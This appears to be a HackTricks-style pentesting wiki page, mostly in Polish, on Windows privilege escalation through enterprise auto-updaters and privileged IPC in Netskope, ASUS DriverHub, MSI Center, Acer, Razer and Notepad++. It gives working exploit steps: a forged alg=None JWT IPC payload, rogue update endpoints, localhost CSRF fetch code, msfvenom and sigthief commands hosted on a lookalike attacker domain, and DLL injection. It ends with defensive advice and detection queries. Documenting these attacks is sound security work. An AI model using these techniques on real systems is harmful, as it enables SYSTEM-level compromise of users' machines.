# Nadużywanie enterprise auto-updaterów i uprzywilejowanego IPC (np. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów eskalacji uprawnień lokalnych na Windows występujących w agentach i aktualizatorach endpointów klasy enterprise, które udostępniają niskotarciową powierzchnię IPC oraz uprzywilejowany proces aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik o niskich uprawnieniach może wymusić rejestrację do serwera kontrolowanego przez atakującego, a następnie dostarczyć złośliwe MSI, które usługa SYSTEM zainstaluje.

Kluczowe pomysły do wykorzystania przeciw podobnym produktom:
- Wykorzystaj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub rekonfigurację na serwerze kontrolowanym przez atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz złośliwy Trusted Root CA i wskaż updaterowi złośliwy, „podpisany” pakiet.
- Omijaj słabe kontrole podpisu (CN allow-lists), opcjonalne flagi digest i luźne właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź key/IV z ogólnodostępnych identyfikatorów maszyny przechowywanych w rejestrze.
- Jeśli usługa ogranicza dzwoniących według ścieżki obrazu/nazwy procesu, wstrzyknij się do procesu z listy dozwolonych lub uruchom jeden w stanie zawieszenia i załaduj swój DLL poprzez minimalną poprawkę kontekstu wątku.

---
## 1) Wymuszenie rejestracji do serwera kontrolowanego przez atakującego przez localhost IPC

Wiele agentów dostarcza proces UI w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP używając JSON.

Zaobserwowano w Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploita:
1) Stwórz token JWT do rejestracji, którego claims kontrolują host backendu (np. AddonUrl). Użyj alg=None, aby nie wymagać podpisu.
2) Wyślij wiadomość IPC wywołującą polecenie provisioning z twoim JWT i nazwą tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna odpytywać twój rogue server o enrollment/config, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notatki:
- Jeśli weryfikacja wywołującego jest oparta na ścieżce/nazwie, wygeneruj żądanie z binarki dostawcy umieszczonej na allow-liście (zob. §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Po nawiązaniu połączenia klienta z twoim serwerem, zaimplementuj oczekiwane endpoints i nakieruj go na attacker MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem sprawdzania aktualizacji, np.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA w formacie PEM. Usługa instaluje go do Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcza metadata wskazujące na złośliwy MSI i fałszywą wersję.

Bypassing common checks seen in the wild:
- Signer CN allow-list: usługa może jedynie sprawdzać, czy Subject CN jest równe „netSkope Inc” lub „Netskope, Inc.”. Twój rogue CA może wydać leaf z tym CN i podpisać MSI.
- CERT_DIGEST property: dołącz benign MSI property o nazwie CERT_DIGEST. Brak egzekwowania podczas instalacji.
- Optional digest enforcement: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Result: usługa SYSTEM instaluje twój MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
wykonując dowolny kod jako NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope owijało IPC JSON w pole encryptData, które wygląda jak Base64. Reverse engineering wykazał AES z kluczem/IV wyprowadzonym z wartości rejestru czytelnych przez dowolnego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe zaszyfrowane polecenia jako standardowy użytkownik. Ogólna wskazówka: jeśli agent nagle „szyfruje” swoje IPC, szukaj device ID, product GUID, install ID pod HKLM jako materiału.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Niektóre usługi próbują uwierzytelnić peer przez resolution PID połączenia TCP i porównanie ścieżki/nazwy obrazu z allow-listą binarek vendor w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection do procesu z allow-listy (np. nsdiag.exe) i proxy IPC z jego wnętrza.
- Uruchomienie binarki z allow-listy w stanie suspended i bootstrap twojego proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły tamper wymuszane przez driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produkty często dołączają minifilter/OB callbacks driver (np. Stadrv), który usuwa niebezpieczne prawa z handle'ów do chronionych procesów:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny user-mode loader, który respektuje te ograniczenia:
1) CreateProcess vendor binary z CREATE_SUSPENDED.
2) Uzyskaj handle'e, które nadal są dozwolone: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesie oraz handle do wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME jeśli patchujesz kod przy znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, gwarantowany-mapped thunk) małym stubem, który wywołuje LoadLibraryW na ścieżce twojego DLL, a potem skacze z powrotem.
4) ResumeThread, aby wywołać stub w procesie i załadować twój DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na już chronionym procesie (stworzyłeś go), polityka drivera jest spełniona.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatyzuje rogue CA, podpisanie złośliwego MSI i udostępnia wymagane endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope to custom IPC client, który tworzy dowolne (opcjonalnie AES-encrypted) IPC messages i zawiera suspended-process injection, by pochodzić z allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Kiedy masz do czynienia z nowym endpoint agentem lub zestawem „helper” płyty głównej, szybki workflow zwykle wystarcza, by stwierdzić, czy patrzysz na obiecujący privesc target:

1) Enumerate loopback listeners i zmapuj je z powrotem do vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Wylicz potencjalne named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Wydobądź dane routingu przechowywane w rejestrze używane przez serwery IPC oparte na wtyczkach:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Najpierw wydobądź nazwy endpointów, klucze JSON i ID poleceń z klienta w trybie użytkownika. Spakowane frontendy Electron/.NET często leak the full schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Praktyczny przebieg:
1) Zarejestruj domenę zawierającą `.asus.com` i umieść na niej złośliwą stronę.
2) Użyj `fetch` lub XHR, aby wywołać uprzywilejowany endpoint (np. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Wyślij JSON body oczekiwany przez handler – spakowany frontend JS pokazuje schemat poniżej.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Nawet PowerShell CLI pokazany poniżej działa, gdy nagłówek Origin jest spoofed na zaufaną wartość:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Nieprawidłowa weryfikacja podpisu kodu i klonowanie certyfikatu (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` pobiera dowolne pliki wykonywalne zdefiniowane w JSON body i cache’uje je w `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Walidacja URL ponownie używa tej samej logiki substring, więc `http://updates.asus.com.attacker.tld:8000/payload.exe` jest akceptowany. Po pobraniu ADU.exe jedynie sprawdza, że PE zawiera podpis i że Subject string odpowiada ASUS przed uruchomieniem – brak `WinVerifyTrust`, brak weryfikacji łańcucha certyfikatów.

Aby wykorzystać ten przepływ:
1) Stwórz payload (np. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Sklonuj signer ASUS do niego (np. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostuj `pwn.exe` na domenie wyglądającej jak `.asus.com` i wywołaj UpdateApp przez przeglądarkowy CSRF powyżej.

Ponieważ zarówno filtry Origin jak i URL są oparte na substringach, a sprawdzenie signera porównuje tylko stringi, DriverHub pobiera i uruchamia złośliwy binarny plik atakującego w swoim podwyższonym kontekście.

---
## 1) TOCTOU w ścieżkach kopiuj/uruchom w updaterze (MSI Center CMD_AutoUpdateSDK)

Usługa SYSTEM MSI Center udostępnia protokół TCP, gdzie każdy frame to `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Główny komponent (Component ID `0f 27 00 00`) dostarcza `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Jego handler:
1) Kopiuje dostarczony plik wykonywalny do `C:\Windows\Temp\MSI Center SDK.exe`.
2) Weryfikuje podpis za pomocą `CS_CommonAPI.EX_CA::Verify` (certificate subject musi być równy “MICRO-STAR INTERNATIONAL CO., LTD.” i `WinVerifyTrust` musi się powieść).
3) Tworzy scheduled task, który uruchamia plik tymczasowy jako SYSTEM z kontrolowanymi przez atakującego argumentami.

Skopiowany plik nie jest zablokowany między weryfikacją a `ExecuteTask()`. Atakujący może:
- Wysłać Frame A wskazujący na legalny binarny plik podpisany przez MSI (zapewnia, że weryfikacja podpisu przejdzie i zadanie zostanie zaplanowane).
- Rywalizować z powtarzanymi Frame B, które wskazują na złośliwy payload, nadpisując `MSI Center SDK.exe` zaraz po zakończeniu weryfikacji.

Gdy scheduler się odpali, wykona nadpisany payload jako SYSTEM pomimo tego, że oryginalny plik został zweryfikowany. Niezawodne wywołanie używa dwóch goroutine/threads, które spamują CMD_AutoUpdateSDK aż okno TOCTOU zostanie wygrane.

---
## 2) Nadużywanie niestandardowego IPC na poziomie SYSTEM i impersonacja (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Każdy plugin/DLL załadowany przez `MSI.CentralServer.exe` otrzymuje Component ID przechowywane pod `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Pierwsze 4 bajty frame wybierają ten komponent, pozwalając atakującym kierować polecenia do dowolnych modułów.
- Pluginy mogą definiować własne task runnery. `Support\API_Support.dll` eksportuje `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` i bezpośrednio wywołuje `API_Support.EX_Task::ExecuteTask()` bez **żadnej weryfikacji podpisu** – każdy lokalny użytkownik może wskazać `C:\Users\<user>\Desktop\payload.exe` i deterministycznie uzyskać wykonanie jako SYSTEM.
- Podsłuchiwanie loopbacka w Wireshark lub instrumentacja .NET binary w dnSpy szybko ujawnia mapowanie Component ↔ command; niestandardowe klienci w Go/Python potem mogą odtwarzać frame’y.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) udostępnia `\\.\pipe\treadstone_service_LightMode`, a jego discretionary ACL pozwala zdalnym klientom (np. `\\TARGET\pipe\treadstone_service_LightMode`). Wysłanie command ID `7` z ścieżką pliku wywołuje routine tworzącą proces.
- Biblioteka kliencka serializuje magiczny terminator byte (113) razem z args. Dynamiczna instrumentacja z Frida/`TsDotNetLib` (zob. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) dla wskazówek dotyczących instrumentacji) pokazuje, że natywny handler mapuje tę wartość na `SECURITY_IMPERSONATION_LEVEL` i integrity SID przed wywołaniem `CreateProcessAsUser`.
- Zamiana 113 (`0x71`) na 114 (`0x72`) przełącza do ogólnej gałęzi, która zachowuje pełny token SYSTEM i ustawia high-integrity SID (`S-1-16-12288`). Spawnowany binarny plik zatem uruchamia się jako nieograniczony SYSTEM, zarówno lokalnie jak i cross-machine.
- Połącz to z ujawnionym flagem instalatora (`Setup.exe -nocheck`) żeby postawić ACC nawet na lab VM i testować pipe bez dedykowanego sprzętu vendor’a.

Te błędy IPC podkreślają, dlaczego usługi localhost muszą wymuszać mutual authentication (ALPC SIDs, filtry `ImpersonationLevel=Impersonation`, token filtering) i dlaczego każdy modułowy helper „run arbitrary binary” musi stosować te same weryfikacje signerów.

---
## 3) COM/IPC “elevator” helpers oparte na słabej walidacji w trybie użytkownika (Razer Synapse 4)

Razer Synapse 4 dodał kolejny użyteczny wzorzec do tej rodziny: niskoprzywilejowany użytkownik może poprosić COM helper o uruchomienie procesu przez `RzUtility.Elevator`, podczas gdy decyzja zaufania jest delegowana do user-mode DLL (`simple_service.dll`) zamiast być solidnie egzekwowana wewnątrz uprzywilejowanej granicy.

Obserwowany path eksploatacji:
- Zainstancjonuj obiekt COM `RzUtility.Elevator`.
- Wywołaj `LaunchProcessNoWait(<path>, "", 1)` aby zażądać podwyższonego uruchomienia.
- W publicznym PoC bramka PE-signature wewnątrz `simple_service.dll` jest wyłaczana/patchowana przed wysłaniem żądania, pozwalając dowolnemu atakującemu na uruchomienie wybranego przez siebie pliku wykonywalnego.

Minimalne uruchomienie PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Generalne wnioski: podczas analizy pakietów „helper” nie ograniczaj się do localhost TCP czy named pipes. Sprawdź klasy COM o nazwach takich jak `Elevator`, `Launcher`, `Updater` lub `Utility`, a następnie zweryfikuj, czy uprzywilejowana usługa rzeczywiście weryfikuje sam docelowy plik binarny, czy jedynie ufa wynikowi obliczonemu przez łatwo modyfikowalny user-mode client DLL. Ten wzorzec wykracza poza Razer: każdy split design, w którym broker z wysokimi uprawnieniami przyjmuje decyzję allow/deny pochodzącą ze strony o niskich uprawnieniach, jest potencjalną powierzchnią privesc.

---
## Zdalne przejęcie łańcucha dostaw przez słabą walidację updatera (WinGUp / Notepad++)

Starsze update’y Notepad++ oparte na WinGUp nie weryfikowały w pełni autentyczności aktualizacji. Gdy atakujący przejęli hosting serwera aktualizacji, mogli modyfikować manifest XML i przekierowywać tylko wybranych klientów na złośliwe URL-e. Ponieważ klient akceptował dowolną odpowiedź HTTPS bez egzekwowania zarówno zaufanego łańcucha certyfikatów, jak i prawidłowego podpisu PE, ofiary pobierały i wykonywały trojanizowany NSIS `update.exe`.

Przebieg operacji (bez lokalnego exploita):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Wnioski dotyczące hardeningu/detekcji dla dowolnego auto-updatera:
- Wymuszaj **certificate + signature verification** pobranego instalatora (pin vendor signer, odrzucaj niezgodny CN/chain) i podpisuj sam manifest aktualizacji (np. XMLDSig). Blokuj przekierowania kontrolowane przez manifest, chyba że zostaną zwalidowane.
- Traktuj **BYO signed binary sideloading** jako punkt wykrywania po pobraniu: generuj alert, gdy podpisany vendor EXE ładuje nazwę DLL spoza swojego kanonicznego katalogu instalacyjnego (np. Bitdefender ładujący `log.dll` z Temp/Downloads) oraz gdy updater upuszcza/wykonuje instalatory z temp z podpisami innych niż vendor.
- Monitoruj **specyficzne artefakty malware** obserwowane w tym łańcuchu (użyteczne jako ogólne pivoty): mutex `Global\Jdhfv_1.0.1`, anomalne zapisy `gup.exe` do `%TEMP%` oraz etapy wstrzyknięć shellcode sterowane przez Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> uruchamia instalator inny niż Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Te wzorce odnoszą się do każdego mechanizmu aktualizacji, który akceptuje unsigned manifests lub fails to pin installer signers — network hijack + malicious installer + BYO-signed sideloading powoduje remote code execution pod pozorem “trusted” updates.

---
## Odniesienia
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
